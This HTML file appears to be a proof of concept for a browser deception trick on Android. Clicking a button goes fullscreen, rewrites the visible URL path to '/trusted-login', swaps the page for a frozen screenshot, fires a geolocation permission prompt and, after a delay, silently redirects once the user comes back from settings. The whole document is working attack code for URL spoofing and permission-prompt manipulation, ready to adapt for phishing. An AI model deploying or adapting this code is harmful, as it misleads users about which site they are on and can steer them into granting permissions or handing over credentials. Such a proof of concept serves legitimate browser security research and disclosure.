<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Android Geo Redirect Delay PoC</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
  text-align:center;
}
button {
  margin-top:100px;
  font-size:16px;
  padding:14px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}
</style>
</head>

<body>

<button id="start">Start Demooo</button>

<script>
const TARGET = "https://google.com";
let triggered = false;

// freeze UI
function freezeUI() {
  return html2canvas(document.body,{scale:2}).then(canvas=>{
    const img = document.createElement("img");
    img.src = canvas.toDataURL();
    Object.assign(img.style,{
      position:"fixed",
      top:"0",
      left:"0",
      width:"100vw",
      height:"100vh",
      zIndex:"999999"
    });
    document.body.innerHTML="";
    document.body.appendChild(img);
  });
}

// trigger permission
function requestGeo() {
  navigator.geolocation.getCurrentPosition(()=>{},()=>{});
}

// 🔥 redirect dengan delay 5 detik
function delayedRedirect() {
  if (triggered) return;
  triggered = true;

  setTimeout(() => {
    location.replace(TARGET);
  }, 5000); // 5 detik
}

// detect balik dari settings
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    delayedRedirect();
  }
});

window.addEventListener("focus", delayedRedirect);
window.addEventListener("pageshow", delayedRedirect);

// start
document.getElementById("start").onclick = () => {

  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen();
  }

  history.replaceState({}, '', '/trusted-login');

  freezeUI().then(()=>{
    setTimeout(requestGeo, 100);
  });
};

</script>

</body>
</html>
